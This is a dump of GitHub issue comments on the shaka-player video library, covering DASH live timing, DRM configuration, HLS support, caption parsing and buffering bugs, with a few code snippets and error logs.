    "tobbee": "Hi guys,\nI don't think the DASH spec is underspecified, but it is quite complex. It seems to me, that there is indeed an issue in with dynamic MPDs and startNumber in shaka-player. \nI've been working a lot with how to do live streaming correctly in DASH, and made the the DASH-IF live simulator that can be used as a reference (for MPDs using SegmentTemplate with $Number$ this far.\nA bit reason I started working on it was that it was really hard to get live streaming including timing correct for DASH. There is some info about it at https://github.com/Dash-Industry-Forum/dash-live-source-simulator/wiki.\nIn particular, it is possible to choose the startNumber in the MPD and the two MPDs\nhttp://vm2.dashif.org/livesim/snr_0/testpic_2s/Manifest.mpd\nhttp://vm2.dashif.org/livesim/snr_100000/testpic_2s/Manifest.mpd\ndiffer only in startNumber.\nBoth have availabilityStartTime 1970-01-01-00:00:00, but the first one has startNumber 0 and the second 100000. The media segments are generated depending on the path to the MPD and their timing and content is shifted appropriately to make the content be the same at the same live instance independent of the startNumber. Thus, if you use two parallel players running the two different MPDs the playout should be in sync, irrespective of the value of the startNumber.\nThat is also the case if you play them with the dash.js reference player: http://dashif.org/reference/players/javascript/v1.5.1/samples/dash-if-reference-player/index.html\nbut I don't see this behavior in the latest version of shaka-player. (I haven't back-tracked to see if if was the case before).\nSome more details:\nFor MPDs with type dynamic, it is important to look at the combo \"availabilityStartTime + period@start\" (AST + PST) and \"startNumber\" and the current time.\nstartNumber refers to the segment that is available one segmentDuration after the period start (at the period start, only the init segments are available),\nFor dynamic MPDs, you shall \"never\" start to play with startNumber, but the latest available segment is LSN = floor( (now - (availabilityStartTime+PST))/segmentDuration + startNumber- 1).\nIt is also important to align the mediaTimeLine (based on baseMediaDecodeTime) so that it starts at 0 at the beginning of the period.\nIn any case, you're not allowed to change the availabilityStartTime at any point, so a later manifest can only have additional periods (and old one removed), or updates to the SegmentTimeline.\nDASH-IF has had a lot of discussions on these topics so there are more complete descriptions and applications in their interoperability guide lines.The latest is V3.1 with improved live available at http://dashif.org/guidelines/\nI hope that the MPD URLs provided above can help in testing the timing behavior of the dhaka-player. If you want to have other test-cases implemented in live-simulator, please add an issue to the Github project.\n. ",
    "mattcoz": "@cpeterso Tested in 42 and 45 Nightly on Windows 10 and 42 on Windows 7, can\u2019t seek past around 20 seconds in and it freezes if I let it play that long. Tested in 42 on OSX 10.11, can seek and play fine. The buffering delays look to be a performance problem with our server, we\u2019re looking into it.\n. ",
    "pajong": "Hello @joeyparrish .\nI just realized that I am using v1.5.1, instead of v1.6.0.\nThank you for the answer!\n. @joeyparrish \nThis is the interpretContentProtection callback:\n```\nvar Uint8ArrayUtils = shaka.util.Uint8ArrayUtils;\nvar keyid = Uint8ArrayUtils.fromHex(element.getAttribute('cenc:default_KID'));\nvar key = Uint8ArrayUtils.fromHex(specificKey);\nvar keyObj = {\n    kty: 'oct',\n    kid: Uint8ArrayUtils.toBase64(keyid, false),\n    k: Uint8ArrayUtils.toBase64(key, false)\n};\nvar jwkSet = {keys: [keyObj]};\nvar license = JSON.stringify(jwkSet);\nvar initData = {\n    'initData': keyid,\n    'initDataType': 'webm'\n};\nvar base64 = window.btoa(license).replace(/+/g, '-').replace(/\\//g, '_');\nlicenseServerUrl = 'data:application/json;base64,' + base64;\nreturn [{\n    'keySystem': 'org.w3.clearkey',\n    'licenseServerUrl': licenseServerUrl,\n    'initData': initData\n}];\n```\nI do not get any console error. It shows me the duration, but then buffers without playing the video.\n. Thank you for the answer. I will check the key and key ID again.\nI also noticed that a video with  keys included in the manifest only plays the audio, but the video does not play. I tested on the shaka demo player (http://shaka-player-demo.appspot.com/) with the following manifest: http://html5.cablelabs.com:8100/cenc/ck/dash.mpd\nDo I need to set something up to make the video play?\n. Thank you so much for the answer!\n. @tdrews Thank you for the response.\nIn my content protection callback, I handle both widevine and playready. In the case where the manifest contains both of these content protections, it is not possible to know which one is used to play the video unless I look into the drmInfo.\n. Yes, that is correct.\n. @tdrews Yes, that will work for an interim solution. Thank you so much!\n. ",
    "Doolali": "You can, but for MS Edge you'd have to use PlayReady, not Widevine.\nOn Wed, Dec 2, 2015 at 11:15 AM MegaLabs1 notifications@github.com wrote:\n\nHi all!\nCan someone say is it possible to use Shaka to decode and playback content\nin MS Edge browser?\nShaka test page (shaka-player-demo.appspot.com) does not support widevine\necrypted content with EDGE. We also get errors in our testpage which is\nused for Google Chrome.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/google/shaka-player/issues/242.\n. So I've done what Sarge has and I've forced Edge 25 to use the polyfill EME v20140218 and it's working!\n\nThanks for the help! I'll keep an eye out to see if there is a more permanent fix.\nI ran the above and it just seems to return an object that doesn't seem to have anything in it.\nsetMediaKeys return value [object Object]\nLet me know if you need me to try anything else.\n. I've tested 3-4 different pieces of content on a fresh copy of the master on Edge 20 and 25, so happy to say it's resolved.\n. @sergiofagostinho I was using our own content which we used Unified Streaming's packager to DASH.\n. ",
    "ScottDavies-EET": "Edge will only support PlayReady (and as far as I know will only ever support PlayReady).\nI believe Shaka supports PlayReady and edge, if it doesn't then you can download the source code and make the updates to add the support.\n. ",
    "aldigun": "Thanks for the update. Tested on a clean page and issue can't repro.\n. ",
    "richardmitic": "Yes, the service worker has no DOM access so it makes sense that document.write() has no effect. Opening a debug terminal for any random service worker and entering document.write('') gives the error Uncaught ReferenceError: document is not defined(\u2026).\nI'll try your CLOSURE_IMPORT_SCRIPT solution tomorrow an report back.\n. Using the suggested code raises an explicit DOMException instead of failing to install the classes ;)\nFor now I'll use the compiled version.\n. The full log is:\nGET https://webserver.com:3000/deps.js net::ERR_INVALID_RESPONSE    deps.js:1\nUncaught [object DOMException]                           service_worker.js:13\nLooks like the problem is that deps.js actually resides at /third_party/closure/goog/deps.js\n. This fails with the error message \najax_request.js:379 Uncaught (in promise) Error: Network failure (\u2026)shaka.util.AjaxRequest.createError_ @ ajax_request.js:379shaka.util.AjaxRequest.onError_ @ ajax_request.js:473\najax_request.js:379 Uncaught (in promise) Error: Network failure.(\u2026)shaka.util.AjaxRequest.createError_ @ ajax_request.js:379shaka.util.AjaxRequest.onError_ @ ajax_request.js:473\nsmallapp.js:8 ServiceWorker registration failed:  DOMException: Failed to register a ServiceWorker: ServiceWorker script evaluation failed\nThe line it crashes on is importScripts('third_party/closure/goog/base.js', 'shaka-player.uncompiled.js');. I assume the issue this time is that ajax requests are not available in the ServiceWorker.\n. This fails with the error message \najax_request.js:379 Uncaught (in promise) Error: Network failure (\u2026)shaka.util.AjaxRequest.createError_ @ ajax_request.js:379shaka.util.AjaxRequest.onError_ @ ajax_request.js:473\najax_request.js:379 Uncaught (in promise) Error: Network failure.(\u2026)shaka.util.AjaxRequest.createError_ @ ajax_request.js:379shaka.util.AjaxRequest.onError_ @ ajax_request.js:473\nsmallapp.js:8 ServiceWorker registration failed:  DOMException: Failed to register a ServiceWorker: ServiceWorker script evaluation failed\nThe line it crashes on is importScripts('third_party/closure/goog/base.js', 'shaka-player.uncompiled.js');. I assume the issue this time is that ajax requests are not available in the ServiceWorker.\n. Ok, well anyhow it seems more likely that the issue is with closure rather than shaka. As I said before, the compiled version works with no issues, so let's not worry too much. I'll close.\n. ",
    "msokalski": "For me, it is fine to have it in api, could be even in 'declarative' taste via Player constructor. \n. @ismena In our case, we needed it to 'nicely' behave when user resumes DRM controlled playback. One of possible scenarios should not allow user to seek behind already presented video (-30sec margin).. @ismena VOD only.. Hi :)\n-If current play position is <10 it should immediately seek to 10.\n-Player should automatically pause on 40 (if playing). \n-Seek bar should not allow moving current position before 10 and after 40.\n-Above could be also realized (as a separate boolean param) by mapping 10 to leftmost and 40 rightmost position.. ",
    "jaredscheib": "@joeyparrish any thoughts on this now that v2.0 (beta) is out? Seeking to determine whether it's currently possible to limit a download to a video fragment (start-end range). And, if that's possible but not yet implemented, what the status might be? Or if it's on the back-burner at the moment, does it seem like something that I (or someone outside of the core team) could take a crack at? Thank you for your help!\n. ",
    "ismena": "@msokalski @jaredscheib I'm about to start looking into this. Could you provide some context to help me design it right: when we're talking about limiting the playable/seekable range, are you just interested in not letting a viewer \"go\" beyond the specified time range? Or is there something more you'd like to do with the specified part of the video (like make a loop out of it and play it repeatedly or something along those lines?)\n. @msokalski To clarify: are we talking about live video or VOD?. Sorry for the delay, I was on vacation, but now I'm back and ready to look at this.\nLet me clarify a few things to make sure we're on the same page.\nLet's say I have a 60 second presentation. I use the API to set the range to {start: 10, end: 40}.\n1) Should the presentation start from 0 and show first 10 seconds, but not let me seek back to 0, or should it start from 10?\n2) Once we reach 40 seconds (the end of the window), should the presentation stop or continue to the end without letting me seek past the end of the window?. I added playRangeStart and playRangeEnd configs to PlayerConfiguration, so you can use player.configure() to set these.\nSame as other configurations, they wil take effect starting from the next load() call.\nLet us know if you have any questions!. @joeyparrish Absolutely!\n@vto5623 Thank you for drawing our attention to this, I will work on the fix at once.\n. Hi @vto5623 \nI just checked in a change to account for flags in both the parsing code and tests.\nPlease let me know if you have any questions.\n. Hi @msokalski,\nWe've added the logic to make it possible to delay the license request until playback is started.\nPlease set delayLicenseRequestUntilPlayed flag of shakaExtern.DrmConfiguration to true to enable this behavior. \n. We are just starting investigation and design work at this point.\nWe'll keep this issue up to date with the decisions on what we will and won't support as we get into them.\n. Hi Doug,\nWhen we did the investigation, we found out that we'll have to refactor our streaming model so it works for HLS as well as DASH (the player was initially written with DASH in mind and HLS doesn't fit nicely in our current model).\nI'm working on that right now and will start looking into HLS as soon as it's done.\nI plan to start with clear content support first.\nMy hope is to finish refactoring work this year or early January (it's a pretty big change), so you should start seeing first HLS commits early next year.\nI want to be cautious in terms of speaking to the timeline until I've started the work and have full context, but I'll let you know more as soon as I can!\nThanks for the offer to help with the testing, we're always happy to get feedback.. Hi everyone!\nWe're super excited (especially me :) ) to announce that the CL implementing basic HLS parsing has just landed. It has support for audio and video fmp4 streams (no subtitles yet), parsing and integration with our streaming model.\nThe HLS test asset will soon be available on our demo page after which I'll be starting to look into MPEG2-TS support.\nThis change should appear on our nightly build page shortly. Feel free to try it out and give us feedback.\nAlso, please let us know if you are interested in contributing, we'll be happy to discuss it and get to fully supporting HLS faster!. @avelad I'll take a look!. @avelad Done, but there is a catch. In order to play this stream shaka.hls.HlsParser.DEFAULT_TIME_OFFSET constant will have to be changed from 10 to 0.\n10 seconds seems to be a default start time offset on Apple-encoded content that's why we also set our expectation accordingly.\nWe're still in the process of finding a better way to detect the start time of the content if none has been specified in the manifest. If a manifest specifies EXT-X-START:TIME-OFFSET=n we will respect this value over the default.. Tried with Shaka nightly build and Chrome 52. Confirm that the issue doesn't repro: after opening the laptop the playback continues and successfully plays to the end.\n. Tried with Shaka nightly build and Chrome 52. Confirm that the issue doesn't repro: after opening the laptop the playback continues and successfully plays to the end.\n. Closing due to the fact that the new API has been implemented (and inactivity :)).\nFeel free to reopen if you have issues or questions!. A bug on Chrome to implement support for positionAlign and lineAlign attributes: https://bugs.chromium.org/p/chromium/issues/detail?id=633690\n. @sanbornhnewyyz should be good to go now.\n. Commit that changes buffering goal comparison for reference.\n. @BucherTomas glad single subtitles scenario works for you now. We'll look into multiple one.\n. @BucherTomas thanks for spotting the problem, it should be good now. Please let us now if you have any questions or issues.\n. @BucherTomas thanks again for providing feedback. My understanding is, you meant the \"Assertion failed: switch: expected mediaState to exist\" message that you were seeing in the browser console when switching from unavailable subtitles to available ones. This shouldn't happen anymore. Please let me know if my understanding is incorrect.\n. @ewosleger Ahh, I've been hoping to fix this before you have a chance to open the issue :)\nThe fix is out, please let us know if you have any questions.\n. Hi @jjs1233,\nThanks for reaching out!\nCould you please give us a bit more detail about the issue, we have an issue template that might help.\nFrom what I understand the repro goes as following:\n1) Successfully start playback of an asset\n2) While the video is playing open console in a browser and execute the command \"shakaDemo.load(\"another video\");\" where \"another video\" is a path to the video.\n3) An error occurs\nIs my understanding correct or did I miss something?\nWhat browser are you using?\n. We are unable to reproduce the problem.\nIf you're aware of the way to repro it using our demo app, please let us know.\nOtherwise, are you able to share your application with us, so we can take a look at what's going on there?\n. @jjs1233 no worries, glad to hear your problem is fixed. \nDo reach out if you run into issues in future.\n. @robwalch Done! No errors anymore.\nLet us know if you have any questions.\n. Hi Michael, thanks for reporting.\nHere's what's happening there: playback starts at high speed and then we significantly drop it by throttling the network. The player checks if it has content buffered and at that point it does, so it proceeds to fetch a new segment. A request for video starts, but takes a long time to finish because the network is slow. While the request is in that state, we run of of buffered video content, but not of audio/text which got buffered earlier when the network was faster (since they're more lightweight). \nThe request for video is eventually finished and buffering event gets invoked.\nThe reason I'm boring you with two days of my investigative work is to say that this scenario is caused by a significant drop of network speed and thus is fairly artificial and not very likely to happen in real world. (If you enter throttling mode before loading the video, there won't be a delay in the buffering state).\nThat being said, current behavior is definitely a bug on our part, and we'll put it on road map for fixing. \nThanks again, let me know if you have any questions!\n-Sandra\n. @mdownplane @Feenposhleen \nI just pushed a fix that changes our approach to buffering and should resolve any issues related to not triggering the buffering event.\nPlease let us know how that works for you and thanks again for reporting.\n. Thanks for reporting, Brad, I'll look into it.\n. @baseballbrad3 Should be good now. Please let us know if you have any questions or issues.\n. Hi Yair,\nAre you still seeing this issue? We're having trouble getting a repro: when I load the custom manifest you provided, I get a smooth playback. (I also tested in Edge and Win10 just in case).\nCould you try a different device to exclude the possibility of the experience being related to a particular machine you're using.\n. @yairans Could you run \"JSON.stringify(shakaDemo.localPlayer_.getStats())\" command in the browser console and post the response that you get. This might give me some clues on what's going on with your playback.\n. That's right, this had the same problem as #545. \n@erankor I tested your stream with the fix and it seems to be fine.\n(I also liked the video :) ).\nLet me know if you have any questions.\n. That's right, this had the same problem as #545. \n@erankor I tested your stream with the fix and it seems to be fine.\n(I also liked the video :) ).\nLet me know if you have any questions.\n. The CL looks good otherwise :)\n. The CL looks good otherwise :)\n. @PatrikCarlander \nThanks for such a detailed repro, we'll look into it.\n. I'm starting to think this might be a problem with this particular test stream that surfaced after the buffering goal calculation change.\n@PatrikCarlander, did you encounter the issue through the \"live profile with five periods\" stream or do you have a custom stream that behaves the same way? Do you know of any other affected stream (demo or custom)?\n. @PatrikCarlander would you be able to provide a manifest for one of your custom streams that are also affected?\n. Sounds good. I will reach out to you by email if we need a stream example.\n. Found it!\nThe problem wasn't in the new buffering logic, but in the way we were getting a segment reference to calculate it.\n(That's why I originally blamed the stream itself thinking it had a 'ghost' segment).\nThanks @PatrikCarlander, having a second example helped.\nLet me know if the fix resolves the problem with your custom stream.\n. @birme Did you contribute to the project before?\n(Before I merge, I have to make sure you've added yourself to CONTRIBUTORS and all that jazz)\n. Merged! Thanks for the contribution.\n. Merged!\n. @birme Sorry, I was on vacation :) Thanks for the PR, we'll take a look.\n@joeyparrish Could you take a look when you have time? I feel like the change of this size needs your experience :). @shanmugapriyaEK we have recently changed the language selection API which seems to have taken care of this issue.\nThe code is in the latest master. Please feel free to reopen if you are still having problems.. @TobbeEdgeware you're very welcome to make a PR if you'd like, otherwise we'll do it when we have a chance.. Hi, thanks for reaching out.\nWe have recently refactored our approach to video and audio tracks in order to support HLS.\nIn the new world rather than treating audio and video tracks separately, we combine them into variants (audio+video combinations).\nIt hasn't been officially \"released\" yet, but you can see it at our nightly build: https://nightly-dot-shaka-player-demo.appspot.com and the latest master has it.\nThe new approach is that you select a language and get all the audio+video combinations in that language. (The default language is the one specified in player configurations).\nSame stands for subtitle language.\nHence the answer to your second question: enabling abr will restore both audio and video since we are now treating them as a single unit.\nPlease take a look at how it works at the nightly build and let me know if you have any questions.\nI can also bug @joeyparrish for the estimation on when this change is going to be released if this is something you would like to know :). @beaufortfrancois Cool, let me run it through our test bot.. @rounce we had to introduce this change in order to be able to add support for HLS (the way HLS manifest is structured there is no way for us to know certain information about individual streams that is needed to operate on a stream level).\nFor DASH manifests we are creating variants for all possible audio+video combinations, so if you want to keep current video track, but change the audio you should be able to find the right variant track.\nFor a visual on how things work in the new world you can check out our nightly build demo page (under \"info\" section).\nSorry that this change complicated things for you. If you have a specific use case you're worried about, we'd be happy to advise on how to best accommodate it with v2.1 streaming logic if you do decide to upgrade. . Okay, this is done. If the old and the new variants have the same video or audio stream, only the buffer of the type that changed will be cleared.. @rkuroiwa thanks for the detailed report!\n@theodab @vaage-google if one of you guys wants some practice with our text parsers and mp4 this might be a good bug for it. (There is a program called iso viewer that translates mp4 files into human-readable form, another tool is http://thumb.co.il/).\nOtherwise, I'll look at this next week if @TheModMaker doesn't get to it first :). @OrenMe thanks for reaching out.\nLet me make sure I understand the question: are we talking Microsoft Smooth Streaming?. Got you! We have recently started adding support for HLS and it's possible we will proceed with implementing support for smooth streaming as well in the future, but it's not on our road map at the moment.\nI haven't closely looked at the format, so please take this as an educated guess: our approach to HLS has been to write a parser plugin that parses the manifest and hooks it up with already existing Shaka streaming logic. I think that might the way to go with smooth streaming as well.\nYou can take a look at how dash and hls parsers do they work and integrate with streaming in lib/dash and lib/hls if that helps.\n. @ToreJuloe thanks for the links! We'll be sure to take a look if we start working on this. It also could be useful if someone wants to do a PR on this.. Hi @filipepeixinho,\nTo the best of my knowledge having licence server uri on the manifest isn't compliant with the DASH spec, so your content must be somewhat unconventional. As I mentioned in the email exchange we had on this, we might be able to help you better if you provide an example of the server uri on the manifest.\nIn the meantime, I think your best bet would be to modify the dash_parser.js for your project to read uri and store it as part of the manifest object. You then could add a call to configure somewhere around this line: https://github.com/google/shaka-player/blob/master/lib/player.js#L530\nplayer.configure({\n    drm: {\n      servers: { 'com.widevine.alpha': manifest.licenseServerUri }\n    }\n  });. Let me run it through our build bot. No worries, do reach out of you have questions in the future!. I just tried controlling the playback from a Google Home app on my phone and it worked, so I'm cautiously optimistic that this is something that works \"from the box\".\n@alex-schwartzman Let me see if I can get additional confirmation from another source before we call it a day.\n. Okay, the bad news is there is some work to be done to make this happen after all.\nThe good news is I think I know how to test this now :)\nWill look into the implementation!. Actually @alex-schwartzman, do you mind syncing up with me on how you're testing this and what the expected result would be?\nIs there a remote control app you use? Or do you make use of a possibility to control Chromecast with a TV remote?\nI thought I would rely on the remote control dialog that appears on my Android phone when Chromecast is used, but it dawned on me that this might not be what you had in mind.\nIf you could describe a use case I can use to verify that the implementation works it would be perfect.\n. Hey Alex, we just pushed the implementation for this.\nPlease let us know how it works for you and reach out if we need to do any adjustments.. @silverbucket thanks for the PR. Could you provide some examples of the use cases for this change?. Thanks for the explanation! Let me see if i got you right: your code doesn't have access to the Player's internals (or wants to access the Media Element from outside the class), correct?\nI wasn't sure what you meant by 'video position information', so let me note that you're talking about current playback time (video_.currentTime), you can get it from Playhead.getTime().. The tests passed, so I'm ready to merge if you're still interested :). @silverbucket There you go!. Let me summon the Big Shaka Boss for that question :)\n@joeyparrish . The change is checked in. shakaExtern.AbrConfiguration now includes switchInterval, bandwidthUpgradeTarget and bandwidthDowngradeTarget fields.. @marcusparnwell You're addressing the right person in terms of asking about the release date. While Joey's getting back to you on this, let me note that the change is already available in the latest master should you want to get it sooner than it's officially released.. @Canta We added an ignoreDrmInfo flag to shakaExtern.DashManifestConfiguration that should be able to help in your case.\nSetting it to true will result in ignoring the drm information provided by the manifest.\nPlease let us know how it works for you or if you have any questions!. Sounds good. Closing the issue.. I think we can do that! Let me tentatively schedule it for 2.2 (tentatively in case our project visionaries don't approve :)).\nPlease note, that we don't have separate audio/video tracks anymore. Instead we have variant tracks which represent audio+video combinations. (This was introduced in 2.1 release which just went out).. Hi @boredom2,\nThe mime type of the file is \"application/vnd.apple.mpegurl\", and our parser didn't recognize it as HLS. (That's the first time I see the mime type like this as well :)).\nLet me try adding it to HLS mime types and see how it goes.. Okay, so registering it as HLS helps, but then the parser starts getting trouble with guessing the mime type of the media segments. It will take a bit of time to figure out how to approach this best, but we're on it!. Okay, it should work now.\nPlease note that the manifest lacks some other info as well (they don't provide language info for audio, for example, so the tracks will have language set to undefined ('und')).. @hghazzi Sorry for the delay, I'm working on this as I write this (l literally have the CL on my other monitor this second :)).\nI'll try to get it into code review this week or early next week and bully the rest of the team to review it ASAP :). Unfortunately we can't add external reviewers to the team's code reviews, but I'll make sure to let you know as soon as it's out.. @hghazzi Just checked this in! We'll be writing an upgrade guide with more information on the new parsing/displaying logic, but please feel free to take a look at the commit and let me know if you have any question in the meantime.\nBasically it's what Joey said it would be in the comment above :). Yes! We also have an upgrade guide which (hopefully) explains how to use it: https://github.com/google/shaka-player/blob/master/docs/tutorials/upgrade-v2-1.md\nFor v2.2 I was about to say we only had one issue left, so probably early next week, but then I saw that @joeyparrish scheduled a few more, so I'm going to point a finger at him to give the new timeline :P. Hi @ewosleger,\nPlease correct me if I misunderstood: looks like you are reporting 2 separate issues:\n1) Captions showing up in reverse order\n2) External text track not being loaded\nIs that right?\nRegarding the first one (captions in reverse order), could you tell me if the 'tts:writingMode' attribute is present on the segment and what it's value is if yes.. @ewosleger I might be able to help with the ordering if you could tell me if the 'tts:writingMode' attribute is present on the segment and what it's value is if yes.. I verified that we are parsing the \"tts:origin\" attribute and constructing the VttCues correctly, so it might be a bug on the browser's side as @TheModMaker mentioned.\nIs this happening in a particular browser?. @avelad thanks for bringing this up, I think we could definitely add this for hls!\nLet me schedule it for 2.2 unless @joeyparrish has objections.. Hi @DanielLindstrm,\nWe switched from individual audio/video tracks to variants(audio+video combinations) starting 2.1 when we added HLS support. (This is the way HLS is structured), so the bandwidth of a variant track will be the combined bandwidth of both audio and video.\nThat being said, I don't see why we couldn't add separate fields for audio and video bandwidth and fill them if we know this information (we will for DASH and won't for HLS).\nWould that help?\nPlease note, that you still won't be able to select individual audio and video streams, but only their variant combinations.. Thanks @kidmiracleman, we'll take a look! As for the content, you can find Joey's (and the rest of the team's) emails in the CONTRIBUTORS file. Feel free to shoot the link to any of us! :). As mentioned in comments to #821 I verified that we are parsing the \"tts:origin\" attribute and constructing the VttCues correctly, so it's likely to be a browser bug.\n@ewosleger, if you let me know which browser(s) is/are affected I could verify the assumption and file bugs on them if need be.. @avelad I am under impression that AES-128 on HLS implies FairPlay. (Please correct me if I'm mistaken).\nIf that's the case, we have an issue about adding FairPlay support: #382. (You can take a look at the comments there to find out how it's going and what kind of complications we ran into with this).\nIf that's not related to FairPlay, let me know, we'll treat this separately!. Ok, let us take a look and see if we can make it work!\nI'm adding this to the backlog since it requires investigation which makes me hesitant about scheduling it for 2.2. @joeyparrish please feel free to override me on this!. Hi @sirpy,\nDid you try it in Safari by any chance? We have an open issue about TS segments in Safari (#743). (Safari has a bug we haven't been able to work around yet).\nI tried the manifest you provided on Chrome with TS support turned on and it worked.. @sirpy \nAh, sorry my previous comment was confusing. I have a custom Chrome build with enabled TS, that's not applicable to a wider audience.\nYou can try our normal demo page with your asset in Microsoft Edge or cast it to Chromecast via Chrome if you have one handy.. We are bound by what browsers can support, so there's not much we can do about this on shaka side. As(if) more browsers add support for TS segments you will be able to use shaka player for it.\nIf you have mp4 content (.mp4 media files rather then .ts) described by hls manifest, it will work with most major browsers today.. @yairans Do I understand correctly that by \"switch to the lowest bitrate\" you mean \"manually select a variant that has low bitrate\"?\nI don't think we currently have an assumption that when a new variant is selected due to a language change it should take current variant's bandwidth as a guideline.\nThis is something we can introduce, but it isn't an obvious conclusion.\nIf it's something we'd like to have, I can think of two ways of approaching it:\n1) Implicit: when new variant is chosen due to a language change, treat current variant's bandwidth as a guideline.\n2) Explicit: introduce a way to explicitly set bandwidth guidance (we have bandwidthUpgradeTarget and bandwidthDowngradeTarget configs, but may be we need something more explicit).\n@joeyparrish let me know what you think!. Hi @theifish,\nLet me make sure I understand you correctly: you would like to know when a new segment is being played even if just a different segment of the same media stream (meaning, nothing changed in terms of bit rate, language, frame rate etc.) Is that right?. There's also filterTextStreamsByRoleAndLanguage that looks pretty much the same way :). @TheModMaker also gave an example in an email thread recently: https://groups.google.com/d/msg/shaka-player-users/fVDlZABXMF4/3b1NnHofAQAJ\n@aaani feel free to take a look.. @boredom2 \nHi Christoph,\nFirst of all, when I tried to load the manifest, I got a network error due to mixed content (http vs https) which resolved when I changed the link to \"https...\", but since you mentioned the UNPLAYABLE_PERIOD error, I assume you got past that :)\nYou said the browsers were Firefox and Chrome. To the best of my knowledge neither of them has support for transport streams at the moment. Shaka should play TS content on Chromecast and Edge (we were unable to make it work on Safari yet due to a bug in their MediaSource implementation).\nNow, when I tested your manifest on Chromecast I get audio playback, but no video. I'll look into that! :)\n(It's not audio-only content, right?). @PidginEnemy \nHi Evgeny,\nI suspect you're testing on a browser other than Edge or Chromecast, is that right?\nExcept for Safari these are the only platforms that supports TS segments (and as I mentioned in a previous comment, we couldn't make it work on Safari yet due to a bug in their MediaSource implementation).\nI tested your manifest on Chromecast and it works!\nLet me know if you have any other questions.. Okay, about the fact that only an audio stream plays in this manifest: https://nexxplayplus6.streaming.mediaservices.windows.net/32de1b7d-822c-43b2-b3a5-1cd97f0e9ae7/242391_src.ism/manifest(format=m3u8-aapl)\nThis was introduced by 434f1bf (CL that fixed #841). The fact that we started grouping variants by codecs and choosing the group with the smallest average bandwidth led to the player always choosing audio-only variants for HLS content that has at least one.\nWe can't switch from audio-only variants to audio+video, so we end up being stuck with audio-only.\nLet me open a separate issue to track this and close this one since the HLS questions seem to be answered now.. @TheModMaker I'm assigning this to you because you fixed #694 that seems to have been similar and is referenced in this issue.\nCould you please check if this is related?. Hi @chrisfillmore,\nNot at the moment. :( \nWe have ad support on our roadmap later this year or in early 2018 I think, which should cover EXT-X-DISCONTINUITY.\nI think we should be able to add support for EXT-X-SESSION-KEY earlier than that. Let me open a separate issue for it. I'll tentatively schedule it for v2.3.. @chrisfillmore We are likely to start looking at EXT-X-SESSION-KEY support soon. Do you think you might be able to privately share some content that has it with us for testing purposes?. Yes, shaka-player-issues would be great, thanks for your help!\n. Mentioning @theodab as the most likely candidate to work on this :) (just so you're aware of the conversation here).. If your content is FP-enrypted it won't work for now (you can follow the whole FP development drama in #382 if you're interested).\nEXT-X-SESSION-KEY tag itself is not restricted to FairPlay, so we can still have it working with other encryption types, which probably doesn't help with your use case though :/. No worries :). Prompted by #914 . That's a bit of a tricky question.\nWe use VTT cues to display text: https://w3c.github.io/webvtt/#vttcue and there is nothing in the interface that displayAlign could directly translate to. Looking at the doc I think we could arguably translate it to VttCue.positionAlign, but it's not supported by browsers at this point (hopefully it will be eventually), so it setting it will have no effect :(\nWe can still do it so it works once browsers implement it, but I'm afraid that's about the best we can do now.\nOn a related note: we're currently working on separating out text parsing and display logic so people can have custom text displayers, so I can make sure displayAlign is at least parsed if someone wants to use it in their custom display.. @rkuroiwa Thanks a lot for such a detailed repro that potentially saved me hours of debugging!\nI think it is indeed an off by 1 error and will start working on the fix right away.. We don't do text rendering at the moment, but we might start in the future as part of our UI effort. (We don't have the scope and timeline for that defined yet).\nThe best answer I can give now is same as with #923. I can make sure we parse these setting in TtmlParser and have them on our internal object representing a text cue once we transition to separate text parsing and display. If you'd like to have a custom text displayer, you'll be able to incorporate the settings.\nIf writing a custom plugin to display text is something that interests you, I can give you a heads up once the change to make it possible has landed.. @avelad will do! I'm hoping to land the change by the end of this week and I'll follow up with you once it's done.. @avelad It seems I confused it with 'tts:writingMode' and though we already had support for it. Now when I look at it actually, I'm not sure I understand what is the significant difference between tts:direction and tts:writingMode.\nWould you have any insight?\nFYI, we're preparing an upgrade guide for v2.2 which will have details on the new parser/displayer system and the steps to upgrade.. Sorry for the delay, I'll try to address this today.. Okay, done :)\nWe are now parsing tts:direction attribute into our writingDirection setting.\nLet me know if you have any questions!. LGTM, let me run this through the build bot.. Small nit: hls parser currently assumes all text streams it encounters are vtt, so will need to update it as well.. Received, thanks!. Hi, do you mind realoading the page/clearing browser cache and trying again? This looks like a caching issue we've been having after deployment of 2.2, but it should be resolved now.\nI also see that you were the one to open #985. Are you still seeing this although the issue from 985 has been resoled? (You left a comment there that made me assume it was working for you now :)).. Hi @SemihGk, thanks for reporting.\nHaving access to the app/content would definitely help us figure out what's going on. Feel free to send it to shaka-player-issues@google.com.. @bes @peet-j Thanks for expressing interest!\n@joeyparrish Could you, please, advise if this is on our road map?. Closing due to inactivity.\nFeel free to open new issues should you have more questions!. It's been a while since there was any activity on this issue.\n@saisasanksunkavalli are you interested in continuing the discussion, on can we go ahead and close the issue?. Closing due to inactivity.\n@odedhutzler Please let us know if there was something else you wanted to know, we'll be happy to reopen and continue the discussion!. @chrisfillmore Thanks for helping us address the questions! :)\n@krvangala Is there anything else we can help you with? Do you need more information?. @dingconggithub you previously mentioned you were getting HLS_MASTER_PLAYLIST_NOT_PROVIDED error. This means that the playlist you use is a Media playlist.\nEverything I say below is much better explained in the HLS spec, but let me at least try to save you time and do my best to explain :)\nHls has two kinds of playlists: Master and Media.\nMedia playlist (which you probably have) describes the media content, lists the segments and so on.\nYour playlist probably looks something like this:\n#EXTM3U\n   #EXT-X-TARGETDURATION:10\n   #EXT-X-VERSION:3\n   #EXTINF:9.009,\n   http://media.example.com/first.ts\n   #EXTINF:9.009,\n   http://media.example.com/second.ts\n   #EXTINF:3.003,\n   http://media.example.com/third.ts\n   #EXT-X-ENDLIST\nA Master on the other hand describes the Media Playlists it contains. An example of Master Playlist:\n```\nEXTM3U\n#EXT-X-STREAM-INF:BANDWIDTH=1280000,AVERAGE-BANDWIDTH=1000000\n   http://example.com/low.m3u8\n   #EXT-X-STREAM-INF:BANDWIDTH=2560000,AVERAGE-BANDWIDTH=2000000\n   http://example.com/mid.m3u8\n   #EXT-X-STREAM-INF:BANDWIDTH=7680000,AVERAGE-BANDWIDTH=6000000\n   http://example.com/hi.m3u8\n   #EXT-X-STREAM-INF:BANDWIDTH=65000,CODECS=\"mp4a.40.5\"\n   http://example.com/audio-only.m3u8\n```\nSo if the Media Playlist above is part of the Master Playlist above, you might get the Media one by following one of the links in Master, let's say \"http://example.com/low.m3u8\" (you actually won't cause it's just an example and not a real Playlist).\nThe general idea is that you might have the same presentation in, say, several languages or video quality might be 